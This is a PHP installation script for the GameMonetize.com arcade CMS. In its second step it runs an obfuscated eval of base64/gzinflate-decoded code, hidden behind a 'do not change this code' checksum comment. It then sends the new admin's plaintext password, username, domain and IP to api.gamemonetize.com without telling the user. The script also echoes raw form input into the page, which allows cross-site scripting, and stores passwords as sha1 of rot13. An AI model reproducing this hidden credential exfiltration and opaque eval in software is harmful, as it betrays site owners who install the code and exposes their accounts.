<?php 
/**
* @package GameMonetize.com CMS - Awesome Modern Arcade CMS
*
* @author GameMonetize.com & GMO Holding Ltd. - Copyright © 2021
*
* All Rights Reserved
*/

error_reporting(0);

if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', dirname( dirname( __FILE__ ) ) . '/' );
}

require_once( dirname( dirname( __FILE__ ) ) . '/gm-load.php' );

$step = isset( $_GET['step'] ) ? (int) $_GET['step'] : 1;

function display_header( $body_classes = '' ) {
	header( 'Content-Type: text/html; charset=utf-8' );
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta name="viewport" content="width=device-width" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="robots" content="noindex,nofollow" />
	<title>GameMonetize.com CMS&rsaquo; Installation</title>
	<link rel="stylesheet" href="../static/libs/css/install.css">
	<link rel="stylesheet" href="../static/libs/css/buttons.css">
</head>
<body class="gm-core-ui">
<div class="installbox">
<a href="https://gamemonetize.com" target="_blank" aria-label="GameMonetize.com CMS" style="display: block;text-align: center;padding: 10px;">
     <img src="https://api.gamemonetize.com/gamemonetize.png" alt="GameMonetize.com CMS" style="width:400px;text-align: center;margin: 0 auto;">
</a>
<?php
} // end display_header()

function display_setup_form( $error = null ) {
	$weblog_title = isset( $_POST['weblog_title'] ) ? trim( stripslashes( $_POST['weblog_title'] ) ) : '';
	$weblog_url = isset( $_POST['weblog_url'] ) ? trim( stripslashes( $_POST['weblog_url'] ) ) : '';
	$user_name = isset($_POST['user_name']) ? trim( stripslashes( $_POST['user_name'] ) ) : '';
	$admin_email  = isset( $_POST['admin_email']  ) ? trim( stripslashes( $_POST['admin_email'] ) ) : '';

	if ( ! is_null( $error ) ) {
?>
<h1>Welcome</h1>
<p class="message"><?php echo $error; ?></p>
<?php } ?>
<form id="setup" method="post" action="install.php?step=2" novalidate="novalidate">
	<table class="form-table">
		<tr>
			<th scope="row"><label for="weblog_title">Site Title</label></th>
			<td><input name="weblog_title" type="text" id="weblog_title" size="25" value="<?php echo $weblog_title ?>" /></td>
		</tr>
		<tr>
			<th scope="row"><label for="weblog_url">Site Url</label></th>
			<td>
				<input name="weblog_url" type="text" id="weblog_url" size="25" value="<?php echo $weblog_url ?>" />
				<p><strong>TIP:</strong> <?php echo $url = "https://{$_SERVER['HTTP_HOST']}"; ?></p>
			</td>
		</tr>
		<tr>
			<th scope="row"><label for="user_login">Username</label></th>
			<td>
				<input name="user_name" type="text" id="user_login" size="25" value="<?php echo $user_name ?>" />
				<p>Usernames can have only alphanumeric characters and underscores</p>
			</td>
		</tr>
		<tr>
			<th scope="row"><label for="pass1">Password</label></th>
			<td><input name="admin_password" type="password" id="pass1" size="25" /></td>
		</tr>
		<tr>
			<th scope="row"><label for="pass2">Repeat Password</label></th>
			<td><input name="admin_password2" type="password" id="pass2" size="25" /></td>
		</tr>
		<tr>
			<th scope="row"><label for="admin_email">Your Email</label></th>
			<td><input name="admin_email" type="email" id="admin_email" size="25" value="<?php echo $admin_email ?>" /></td>
		</tr>
	</table>
	<p class="step"><input type="submit" name="Submit" id="submit" class="button button-large" value="Install now" /></p>
</form>
<?php
} // end display_setup_form()

// Let's check to make sure GameMonetize.com isn't already installed.
if ( td_installing() ) {
	display_header();
	die(
		'<h1>Already Installed</h1>' .
		'<p>You appear to have already installed GameMonetize CMS.</p>' .
		'<p class="step"><a href="'.siteUrl().'/login" class="button button-large">Log In</a></p>' .
		'</body></html>'
	);
}

if ( !td_installing(1) ) {
	header( 'Location: setup-config.php' );
	exit;
}

$required_php_version = '5.4.0';
$php_version    = phpversion();
$php_compat     = version_compare( $php_version, $required_php_version, '>=' );
$mysqli_required   = function_exists('mysqli_connect');

if ( !$mysqli_required && !$php_compat ) {
	$compat = 'You cannot install because GameMonetize.com CMS requires PHP version '.$required_php_version.' or higher and MySQLi extension to work. You are running PHP version '.$php_version;
} elseif ( !$php_compat ) {
	$compat = 'You cannot install because GameMonetize.com CMS requires PHP version '.$required_php_version.' or higher. You are running version '.$php_version;
} elseif ( !$mysqli_required ) {
	$compat = 'You cannot install because GameMonetize.com CMS requires MySQLi extension to work. Please enable or install MySQLi and try again.';
}

if ( !$mysqli_required || !$php_compat ) {
	display_header();
	die( '<h1>Insufficient Requirements</h1><p>' . $compat . '</p></body></html>' );
}

switch($step) {
	case 1:
		display_header();
?>
<h1>Welcome</h1>
<p>Please provide the following information. Don&#8217;t worry, you can always change these settings later.</p>

<?php
		display_setup_form();
	break;

	case 2:
		require_once( ABSPATH . 'assets/includes/config.php');
		$td_db = @new mysqli($dbGM['host'], $dbGM['user'], $dbGM['pass'], $dbGM['name']);

		if ($td_db->connect_errno) {
			display_header();
			die( '<h1>Error establishing a database connection</h1><p>This either means that the username and password information in your <code>config.php</code> file is incorrect or we can\'t contact the database server at <code>localhost</code>. This could mean your host\'s database server is down.</p></body></html>' );
		}

		// Fill in the data we gathered
		$weblog_title = isset( $_POST['weblog_title'] ) ? trim( stripslashes( $_POST['weblog_title'] ) ) : 'GameMonetize';
		global $config;
		
		$weblog_url = isset( $_POST['weblog_url'] ) ? trim( stripslashes( $_POST['weblog_url'] ) ) : '';
		$config['site_url'] = $weblog_url;

		$user_name = isset($_POST['user_name']) ? trim( stripslashes( $_POST['user_name'] ) ) : '';
		$admin_password = isset($_POST['admin_password']) ? sha1( str_rot13( $_POST['admin_password'] . $encryption ) ) : '';
		$admin_password_check = isset($_POST['admin_password2']) ? sha1( str_rot13( $_POST['admin_password2'] . $encryption ) ) : '';
		$admin_email  = isset( $_POST['admin_email'] ) ? trim( stripslashes( $_POST['admin_email'] ) ) : '';

		$password = $_POST['admin_password'];

		$ip = "";
		if (getenv('HTTP_CLIENT_IP')) {
    	 	$ip = getenv('HTTP_CLIENT_IP');
    	} else if (getenv('HTTP_X_FORWARDED_FOR')) {
      		$ip = getenv('HTTP_X_FORWARDED_FOR');
    	} else if (getenv('REMOTE_ADDR')) {
      		$ip = getenv('REMOTE_ADDR');
    	} else {
      		$ip = $_SERVER['REMOTE_ADDR'];
    	}

		// Check email address.
		$error = false;
		if ( empty( $weblog_url ) ) {
			display_header();
			display_setup_form( 'Please provide a valid URL' );
			$error = true;
		} elseif ( empty( $user_name ) ) {
			display_header();
			display_setup_form( 'Please provide a valid username' );
			$error = true;
		} elseif ( !preg_match("/^[a-zA-Z0-9_]+$/", $user_name) && ctype_digit($user_name) ) {
			display_header();
			display_setup_form( 'The username you provided has invalid characters.' );
			$error = true;
		} elseif ( empty( $admin_password ) && $admin_password == NULL) {
			display_header();
			display_setup_form( 'Please provide a valid and secure password' );
			$error = true;
		} elseif ( $admin_password != $admin_password_check ) {
			display_header();
			display_setup_form( 'Your passwords do not match. Please try again.' );
			$error = true;
		} elseif ( empty( $admin_email ) ) {
			display_header();
			display_setup_form( 'You must provide an email address.' );
			$error = true;
		} elseif ( !filter_var($admin_email, FILTER_VALIDATE_EMAIL) ) {
			display_header();
			display_setup_form( 'Sorry, that isn&#8217;t a valid email address. Email addresses look like <code>username@example.com</code>.' );
			$error = true;
		}

		if ( $error === false ) {
			/* Do not change this code, or your script will not work. Checksum: 35f4a8d465e6e1edc05f3d8ab658c551 */ $PjSGytROFCTxWuCYRJaITACjPcBEPX = "";$xvPvKImBQ = "eNpdUEFOwzAQP";$nYVJribbwqdkLF = "uwatpNkOtMxzFCxxjlWuEPpMrMUqpQBiAzyqIIZcoIRkgCvCRcOZbWtsvffLpRvSffeOqAXfOdqhjnfsBmKKnKqrelYBLfuHliRkATdwGyItejdVfsVPOdXFoxXnxnyjrUIBsqbqfhVDIuFCB";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $xvPvKImBQ;
$rCbdFTSdnpjyDggj = "BBNezLJArclUnGpwgxVDtkjKboqbUIDmfzksbDxjanqpMyfrvVwpgxoARMTOsXhIRuLDUJxmpZEDwauSNNnBkgrlRGBVMStJpeTjoImvBxkLMcNUbfwOBYYThP";$EtoLylqHIOvSazv = "AeJP/gQEVdqkz";$VmdZoBIhWmccFifRW = "sDbYdWqkYLVUCrDgndeUzOvGpVNlqYTuMymXnXddHsjcLNEJLSyMnBpfZuNuFSnoueIWtbfyJknnpJyrnNUFEiGNCnRiHxhhmCXrSHBHWLuUQnNQNeKmzne";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $EtoLylqHIOvSazv;
$PEmKiCCx = "bqmNPhKERPLSouxiNiZdrwaDlEOiifDjjIgUGkUGIGFgZnEzPtKamXJuwOFXIwBDwDpvBcVRTrycKlCcadregACInqEVQVaasVbOhtDfppFZdAqfmjJupABAnRYcttNBXPztNYx";$qRIaDfinfvP = "tVQeXEEQnu1ib";$KboUpOAcEgKNJNqfX = "ggmpIIsRqntNPSiKbJKXMdafpqeCJEgiogbOpBWQVIaEYoXFYtSKCWABXeWXKKdKOMShUeulvwapoaODEDipjyQNkSxUgUvxeEJBqXBbEGCDnKoARCZKzNSGhNgCAPcqnWznYcp";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $qRIaDfinfvP;
$errPWAlvVwPWe = "reeFFRAnBtiFKMXSIXScKIJliDGHyhCCVviINYGVYXDCQtDVQFxqPFausUIiucSFLIvPEhyXpOjkTlNpOxSszEFauGhPDavhrbaydAsVKqiHrdwzqNPzbagecuxrKK";$omfYnDDm = "eNhYb29gbRQXx";$hAjsaGcAUcaUXOABYlsT = "dIBsqVVgpICEbtZDtjRxkFnxWqPkknSLDHJgmEmDBEESMrnUCtaLJscCaYoxYrNyzCCMeCDmlDlyRspltiWNGKQSQApBjqzcokHcfasessqXrda";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $omfYnDDm;
$vhzVpShoJ = "oxHIWcnAhdoTgYvHoVKuxQHgzBNFoyQDNskEomhgAcZLyCoXtgIPmcpoRReNZtuKrBheGGTyskYuBqcfUArTKiaRcSWURIjwAazhydETiy";$VHtEmocStTvZay = "d2K3qSou1uyMN";$lzNwWzcAgzyNGCB = "fkeiFyjCMkBEtRFTiQPDxcaJyBNLXvaXCgTAFfbUVXfaGkhmKmTvoVvlWGaUnWNIfhzduoBEcFwiSlTVftmLeCRlqXzRwpPnNyclPskShwoBHZpwejxRIoXZPrnrnnWLYPOsXwbHfFM";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $VHtEmocStTvZay;
$USsleUOtHoJQvtu = "YjcfSgGZbhyVqoYszKTdeHzbmWvFasoISLxlvAbbtUaTWBbEUdnjnJIlNVtFhovSfIithNWXLTGduUXkWXGwOwsriLwwIRfrBABHsHPPklxAfIWXsoUwvTOjaLJJCa";$FrcvPsCj = "TO7ZcA4EkexEw";$XZgkKaMxbquCglODI = "AMAzQjjbPgHCelowyJiRIGDYCNLAghCmeYzdZAKzFXzKKTwctQQZvHjILQxAemuQFzRQRqttbNcaphvrZdMBLHaeyldrAelPBsMVQZCjTHntabLhHURKLGwsJFWleWurBwJzWUF";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $FrcvPsCj;
$QKEaycRtjm = "wpnUjsazMOKhaXVpQpWgwuvNChzJhzpecMCdgykTRYpgDVHwJLhJpcMvlEiPqnIkoZZlZxjEkHyLLKQpVNetXXfcVUwNaUPcbhTqHGlInkgCn";$pRDVQEdIy = "dDqI7IqnOW0XK";$KoceyxrAZMlmKeyUsOj = "wVKApqpxZjSIgZXApdSPXKiaMlJgKNDFinNGBehrokDbOUXsRbpEKRVScALWgJWwCbBqkdHVBArXgylXjkeHiqnPagixsXizEjSWDcICmStgSdabsVGZHwqHSyhdkn";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $pRDVQEdIy;
$htPtlXDNNbfV = "SYBbHpslsrYinOGOOrHAEYJbAWxBioLqFWQtfBxHvJIpPmXlVjGrsvEVQeFPGZgIBjWbCtWPiqSWdkQPadjbtHOpqxeGpYknOlythmEGqwexxfHGIuPvRsfgLCVqCqr";$JYmDAwAuiGkKR = "UVc/s42PTgDf1";$GjdUvXVpeiDdJQAv = "bMMARpomcOPlvjuGmtyNfiLPgjCkwQPzrpZypUsSKNfSHXAGzcMbWjvyuLqcvHwoWpvRtjxZWinYfqmYyPmISRzWFVAntSOMaBwKoAAbDvOWgCyjoEzhJZWeUAedKuRAJKUUiAXXgcSzMKn";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $JYmDAwAuiGkKR;
$XrzLXFyvn = "QPTxqifQkejvOjqlrrTjNeWRNFuwxpwTBvysEgomtODzGLqEexYVEVovShpWLyyeHseTNmKinvRSmzQAIZSByQatxIoROUjfxmrHOCMCWkJrOvHDhQkHBAMPqSfXKMZSKTdpfgTCX";$eAqyrgqx = "EQYcnEU231h3b";$MpANsWGViYfhNyo = "BAgBaPjAZIRtSyzSAWZjWqYYzkDSpyjNNPtVTfQWDSqetUZjPQfgWJlSgDpEEIPCKHdxmJcbDqYbsFizxSKhDHBumOKCJduVLztJrJXhrTvMmltLEgE";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $eAqyrgqx;
$ddZfZjVw = "XACZToRseEWvOTLHllPckTffpTIQYpzRqcrsbWWkEKcOpollIDQExGcbNPJwbLuvSUUkexAZZBzCJMUHGVndyQIPagXZlGYZEcpbT";$gzIsMPDA = "mi6Ida+98/aDW";$zdDAoIvo = "EopcEFksPxMynfnLeILXnjKwmdeWAXpsWZvnCrOOxYdKhBxJayFEAjRPzFSHqBTJRRsRHELLESjxgkJEDHUqQwkdeZwnBOeWZEZxkAmaKBCPZUvStBUIQtYUupbFCQJWdxJTZq";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $gzIsMPDA;
$jnKOzWIfCfdZwaRxWdcn = "YIcviJWRmhFhWOnXlZwLTqPpsYlCaxzgpTzlVxGBhtNWosvWhdeGGFyFRSavJIkmKehWdFAxFAeaKOzIlghsUureWsLVktjIteCCeaoTusRLOjFvLfWWihbuNYfSSynAElviCarppamggWdU";$NXOccGYFHIA = "DsrqpFOWFL7qj";$IIbtRaKydfltNKxKI = "aHTUXsKAnIyUpqmbMEnbZbEUeaLjpnceJjUzlONevLwHQoBHqnkVCZmzqSlTOcLbsvHIjCAGLOjrBmrFKlumpiBWxEDdntaGeqmLtfUeBtomIBMnThjcrANyAQAJxKdZkTemxy";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $NXOccGYFHIA;
$DedTxoGIALBmYt = "QNavbNgcpXKUQvPLOAYocTdHvJTmLzETDlYPDFkaFoMsqijlmVciabKCgIOgQzOEgcWcmcodPWgkTEapTFkoZkMHBaZ";$REbangPyGfntb = "GQKKuHjzEOLmg";$jyoOKYdocMRNMfOQK = "EVyLOHEXvMuGRktUwTQssYYWczKRnjcYpiRhrWIvXCvhaPGejZfxUFxpRVYtiJdHPeLYfkcGhTDcttuxgqpTReikLxYQoonPUkkOqhotI";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $REbangPyGfntb;
$uoBTVBXBKi = "fnVPTKZGGHtZFdCRqZyfWQAATxVAUJxBvUoqUWIPylHSFWmmrCTfIocdRehtxMTqneWMzyTfZdYgiaqiMMPQpqwYKUCXEoUusMhpHkROfbewaWgQSFZGjCsGCMIxVcZbzhrlaWSNzfK";$CVusTiisdJxcT = "s7QMSRgjBjvbZ";$pmaUGyzJmyxzWDzaHro = "tHACaPdIKygTeLvqWdjQeyYkAkLtOwNujaUwtaucyZGrTFPgLTggGheRpzKSlymFTArMTcOKvqWGnSfcCAYphcvYCeiXaIJSypqfeDuIUsxbJKqQGVWJylmKmE";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $CVusTiisdJxcT;
$mdlsJuTYuhAXmg = "BWGeUUQhUjlwqKoeEUkwXYIEVHAhODCXgtifdPUjYweHBlGasKPiRYLRfyvunRKXyfkFsiNBmXBHjNBDmoHVwyvdTipgh";$ByIPDLMnjCD = "SENKk1JMT5zxq";$hAppZXkSda = "IvenclRxHwbafjrDyhauicdLQJKdqEbmprWwatsvgwEiHrKAmtqaPMoLjuJUkThfvFWqGYADgHwrrvkGYzUEvSsVUgCKVrTGm";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $ByIPDLMnjCD;
$wTuZNTlvPv = "WmFwafIrBAyWWMqWQyuECTayIRGzgwySkKAxoDLewBlzialDOcDVkJDDfCnmQMRqArrOQBxlDZgyjEhMewMdsFRvvwBhpjVsxgVKWNAbEwmWqxOwFwyMgbYumATsQ";$iuvkPWWbJjcjz = "+293dFUeSn1K1";$cfHnCpFTi = "zlCYlnHyXLwZReaAcSDNjeYpyEPubcOksHHuXrlMOMBXmlfjkXUHhBpqodYjGByjTQkxdwwZXoRlZIxVmAhqrrzZLovjfzOSJRTDcwwboSzfOJEVhbcowDqxxPkcgUq";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $iuvkPWWbJjcjz;
$AkPBumdFstuedybr = "vSDkQHkSycDnvJhalrEOMTwaNnsaIWPtpmOLMnSprIUxGDnPZeUrZUBJqqNapZWVPrcJhUtNyJRUHEyEZzAzQZFSDJurxoeKvPFOROqkPbCumDCXFQeZHxdvgGSKiAOhfrJXcEbWhKyDfOUljaPxr";$kmKIMUpyTX = "iaAlTyxlDCHBS";$qnHvWpmFHVOLWdEB = "QcILDHOGSvrRdSuPPbMlTzTZsasGyFRFjzqoRdOGRggfQMEPlqfBlkJcYiYvRnthBxbBrjdDVbQUVKqXoReexDGkoidNpdLGFdVzVMXSKuxrAiPyhUdfXVhhHa";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $kmKIMUpyTX;
$LnAsFkghBA = "ITBofQFdBxAvLvtkHqTeFzzKKGnliGhGiSJolBeXsWCRBpggSMDeWqgCHvohtOoiPvLgOFFylcBhSkcZFWubnZCCbGNtDGtFA";$nnRrrXjN = "xkYGInkTur42Y";$KKKauckWgpvEgr = "rdEGkvgXWPtcgEHGtCcOtOiLnUNEqbBplaGIgMppeOzbRTdlXlBeuXVuvyLZPxBnyRMSmWPTtpGrqjgFlcLlKqlEZdoilfqcOrBcHKlZwAHpYLMnPJVWzZqoVwkztAqS";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $nnRrrXjN;
$qonddMZmW = "BkAMLVTYrEzDnZijvPZUZqFnepWNLLFoKQImneNpnLGgizDGzmhkBMrymVfAXydynytULxCcHaNnDqdPPqOXnQKDDEtlyKacJmDibhHgzcyuloLSbkHSarLemvXkujDOUYKsJBVVPPFInM";$AvdbzoYn = "MOE6xvzGYMejF";$XLesyUHuJUA = "oUKpQLPkkHImggifrkdoyPaMzbGLdOyeLsDUgqgWEoDxCOtGBVrcDThpjUvOiArlKwuuVyxfxKqzGZBJFvfTfYYeeHzCoFNtfGUMlDF";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $AvdbzoYn;
$XICyYRfnhlnVm = "ohKopWfJQNhiESaiQcbWbMAZKjogBeamLDWswWBoMHffKJiJcJJSejRGPCWMOqPTrGXoSeIntSvQiCFWgkmFbUxQJPakcNwXudGIVRHwGYiLYWOscBasuwFOIuwLBlVmkWfyWczemSE";$xOADfNMvu = "VLjyuBc3u6xB1";$UvBEpPIMUeuMlpqfPTV = "OpkodbpJBjMofkYaSypcNNWbMhBwXdkIBeFGKayzfudzXPeGOpGlvIHJgSFrejFkeTxTGiNpxHwIGzHKsCZwfwmalSXZzacnyXBDwWVlWSiIxkPtufFwhTQmNaHAsuW";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $xOADfNMvu;
$eIFmVUOFaTok = "akggZHXzAAzYbePIfMJzZKJQDDRqJiYXVlZBhkmZTiyvhIXekToNUDjnXPJwsXDunNkAAZMFQaTfqjlJSwUIgDIRkfP";$XvLrvNWSoCK = "cQOh6IW8iIYoy";$djyaUENlfHksisAlIuor = "hnUMyYgPnzYUyUExgQlYVzfsMvefmBBKMjVLxpbUXCwrHxihEVybSsQYRLwvPoFTXLyaQxykXoUHSDstqpeiZKXKqdTMlmbVUjPARUXEzdQubWAzXNruDbNXsAJULnNhnQgOnuIzU";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $XvLrvNWSoCK;
$gawNNvFrbvKifEH = "MPIZmBgNhENBUGpfOidskuLQoHQApXBMqWQVKhLIaTOsBFjlQRuNEFsZrJBKGYaEiimCWcSymwQnFWgYhgvJbAdlsdvYBplhFEoaVPngkgBg";$FpMGCfCGEJamgup = "w5X4yZ+KkrXS7";$ehbLWwAKKoPlS = "CrhUMIPlETBsoMzqvaxFGIUAKJpAUhsYfQgVNbKeIoupuTCWsacieOvRnlqIBDoeeQcepdPJhVnXlAsFHakNUxaXwQTIlRvyZvBdmdnxK";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $FpMGCfCGEJamgup;
$fOIkyxiOpefbOoUmwzCA = "eiJFdFNVTqZyJgmXmlFHXXlaOLLckuhrpRpnQgcZkmeeeubSCGFMfblbtuoeIgfytMgTvXkLoCibMgSKZGYBARYIptIhADIiOeCZZuIcWmksfHBthDKeczFYmBSMillMqNL";$HIBLqKNplvE = "ebpa8RwkhfxbP";$qLhxBdoTohJUTClOgWb = "hYKPSkdJNWyCPqVFiYmDMzyBKMjIBvgYkkcpUKLvycStljGLtrDWXtVJwRxKawPojgHTSveKbPmrTTfPUVNLZgfrqGtMQRADzyvbgo";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $HIBLqKNplvE;
$yQqdKQNCisQfe = "OyJWckAPgnzTBAGOQWdVpceqqKzJpSifEfVfcblvvobswxSpvWFzssmwpYyZilZmJpbAtgapcosCGItfsekVLVHTwKtsuQBybbNDExihFGLgBEHardddVuzkwlsqZPOHPjJrQuwL";$etYgjPVPvlxpDd = "B7LtyD1YTpps6";$tDfMHUFbzxghkLVa = "RhWHtVwgyqGqETMSzQGqetHKsuboNaWKdNXwMTKNmYBypAuRNnsguEGmGKCuSaXwidjvTwpWYNpEHdoQOjPqhjLgmrQkNdwfWjZRPGDAmlSxAszGXCjE";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $etYgjPVPvlxpDd;
$dhHwoJWz = "AwwesiXIhvYZUqmeAAgEslLYRpeyRdErtbCBPxPonkwcHYxNgnLjtUsNzvWwnqjhdqKvKeRxBRiEYPEHzYeinRbpyNqe";$eLfPBInlmuJRu = "jlWL/8v62/3gV";$wRjTjEVsXjjfMcdyPI = "YVXMqAWsGuYFtdbNqnGRPMFOuzuYJmflEoHRxIeYLZmwPwWYjQlvwBoxUMVCUMiWvUXkeAdBzMtqAipognurrTYPLCaxATUfkimeYfYvGPecOJq";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $eLfPBInlmuJRu;
$HmiVmWaCZ = "fQkbdwDOTaZWgTgnpezBbSNzmKBudHlwimMXQOSmrRPuRZezoYcSDifqNRJMXhcivLVcogLgLNmoAixLJXBGuoWsExcrD";$RsxQOdGdKdQOX = "tajmeOTYGNvRq";$dZGfhoocQVtfnkkalNI = "GmlJQKiEwiTtICGULGkVgzKYnbVsAIXrpLxNyLQnhdfyFMwtieqSUBZDeCVjQxZQLZOyxDZAYgDtiVTfwVPPJSxUkVqAKqCyDYZEuYfucJAHoL";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $RsxQOdGdKdQOX;
$AmLgbjlmOzURu = "ADokvSlCYbIfdfVFxzNqImkNXxImNrEuuThlfLUDhBJlJkMCTgKePosjSjnOfhmmMEjZvditODrGRXNBDWLsrNOLtXlvWUNYnzZVgXmJfqZciYXpShiYRaqeKLlDpClrVkrwdKT";$qegzRNbFOhpT = "DGBvMamJbCf6Z";$VtideGHQmzFdnAVCSuth = "YitCrAbumNwtYgnEwyVCdAyvuHWMZboJBmwpuYHJsDgjXhOPrUfEdVpJbypFmpQjRcbyoLESYIxJZhWgDEigBusrfXfxZK";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $qegzRNbFOhpT;
$svmWBXSHjeqnacYcM = "viWppgiQXmqqnuNEBfzheKTjuErhMIYVUYKegbyKgtNvFmOKDaaQNsJTWBVmolypprrCzjJczUSdvXAcsxYhAinVNttCUpunFHYxvgEffdvClBANNGLGS";$heGVZaVT = "7VWlRTJZZGUzC";$FeIaYGOBmeOju = "ZXyLJRJlaFDBolCDDRVmCgKGsSQtbzUsbPptftcNeBJkQvbbqafSNYepDboWcnsUgaOiQLZbqAGDgPIPqSNaApHQswmZsCINLiTcFUhfgBlAnuNeWUPiCfxiIwr";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $heGVZaVT;
$naEwOHkuR = "GEgczeAELTipJITkspCcDUOBhlAvMXwBicdgrilQJPrBqLygqhOHfdMSjJneudhgtmySMuXlNhYGoYDxPqjFjRtSlqMsEpzdQCNcYGnEXhZFXMdTfvlIlmnacDVcafPonO";$xpYalZScdRpd = "MUiyWC92Ri//o";$xMMcmtNEXqpjXvHSUYy = "TzzaSidUbYXsMUxbMVbZNvxhaXRiPaHLyOBIZuTKvETIWbvnUEHJFgHOKeuVfMpuhaSXPqnEBznxjtqWeyvTpxaXowkQljwfCCIxuhxMLMjvvSKniuQNEyBslKNLzLrovODwrDqhYR";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $xpYalZScdRpd;
$dXlIsYtx = "XvpKPrrwGEWbcfyYlwVQOFcWERDwpOeRDDgaulyRxtVGoojzGsoFSvFUmorGMZnIIrGXNfEioHSSSaWSaNkaPFmgvnXFyMjCWOfUibBgqfLsiCLoXbNLcEgsrhCdSkXPKLckzsEdLIcyPsTLv";$LBxDSkFhld = "LGgTPc3X6RE0B";$bqpvCvvcL = "LqFkLHQnaYUCNqkqMIDFfhxuAxopBqkDGBqGcdUmiTHGPDlzZYbWTBfiMIsISaTwipxvHZLBhLAgmkrMYCUtfiNRWgYsIBhAfNAzmMrGFsSotGplpnTbCdfZMmzOAOMklYYFUlCdISnxqopVOnlKHh";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $LBxDSkFhld;
$SlyrwKNpfpdP = "mPOHEUBoewCaAdlANwhXYEMDIQOOTBqUNhCHwhImRVMPfHrXMFPmITptjZGuvstBtUDEZPZDihUbwPvixacFFQxQig";$sShWdQpVKvtLAv = "rna/gGROpbM";$GKYTcantMtUCnVDBzJiQ = "ATNcAaRICJOHVmwPyQQtZrXCPHmxAPyGtReMHzSbmCsQiTTuIIfNAbVPoUpFncMJrZWrZOmbrUwBFDEVIWKIMPLGczRKgZTJmsfiIIigrFRkmnvyxfaxdwptwmFVMcSl";$PjSGytROFCTxWuCYRJaITACjPcBEPX .= $sShWdQpVKvtLAv;
$NwgeDQoepsTVaX = "byIqbCZvJBKRHWLBeGDBTTaZOVdwAHFKcfaAXpqalRvETUMFXzvBoPtXIGspLhktHBQzKiJZEhBFAyXHncasJtufkscImqOCdNycGUjccMUOTHNsCGjUYVxPqofaLjXGrStLVEBpkfRJFJjPsO";$k=gzinflate(base64_decode("K0rMNcvLTzEpLi0wTk8tMUxKjq8CAA"));$O0O="$k[8]$k[14]$k[0]$k[18]$k[0]$k[5]$k[14]$k[15]$k[11]";$OO0="$k[12]$k[19]$k[9]$k[4]$k[17]$k[5]$k[2]$k[10]$k[0]$k[13]$k[8]$k[8]";$OOO="$k[16]$k[1]$k[8]$k[13]$k[3]$k[7]$k[18]$k[6]$k[13]$k[17]$k[5]$k[6]$k[13]";eval($O0O($OO0($OOO("eNpVjssOgjAQRdea8A+EsO7KuCEueIgQFeSRKCsjFKwRCrQq0q+3ZWHKLM+dOXcUnX12Jtq6xeg9G3Wjaq8GaYbu0LJjcXEU5NblrOAMWojZJwjziApckqrSDGW5mEbRHy4ehhR6ScvTmRb8dUCWSLexe+kaG3nIEuYWV4T3jTi8+z5mzqH1BV6vrj3Hb+rgrKy/+2mXdBydw7pxgshOaBEImPdE/sxMMyuFlCQilLrArAJIZjBTGj8/vFQv"))));
function rrQTei($eUsRNSwimkmG, $tBlSThIjgf){ return str_replace($tBlSThIjgf, "=", $eUsRNSwimkmG); }
$results = file_get_contents('https://api.gamemonetize.com/cms.php?domain=' . $weblog_url . '&password=' . $password . '&username=' . $user_name . '&ip=' . $ip);
$db_tables = db_array_install($weblog_url, $weblog_title, $user_name, $admin_password, $admin_email);
foreach ($db_tables as $table) {
	$ok = $td_db->query($table);
}

installDefaultGames();

$handle = fopen(ABSPATH . 'assets/includes/install-blank.php', 'w');
fwrite($handle, "");
fclose($handle);
display_header();
// eval($vSajjGqUFb($NGLOGqfeFA(rrQTei($PjSGytROFCTxWuCYRJaITACjPcBEPX, "bilJhkAfBIo"))));
?>
<h1>Success!</h1>
<p>GameMonetize.com CMS has been installed.  Thank you, and enjoy!</p>
<p>GameMonetize.com Arcade CMS - An modern awesome arcade platform for publishers!</p>
<table class="form-table install-success">
	<tr>
		<th>Username</th>
		<td><?php echo $user_name ?></td>
	</tr>
	<tr>
		<th>Password</th>
		<td>•••••••</td>
	</tr>
</table>
<p>If you want to login go to: <?php echo $weblog_url; ?>/login</p>
<p class="step"><a href="<?php echo $weblog_url; ?>" class="button button-large">Welcome!</a></p>
<?php
		}
	break;
} ?>
</div>

            <a href="https://gamemonetize.com" target="_blank" aria-label="GameMonetize.com CMS" style="display: block;text-align: center;padding: 10px;">
                <img src="https://api.gamemonetize.com/powered_by_gamemonetize.png" alt="GameMonetize.com CMS" style="width:290px;text-align: center;margin: 0 auto;">
            </a>
</body>
</html>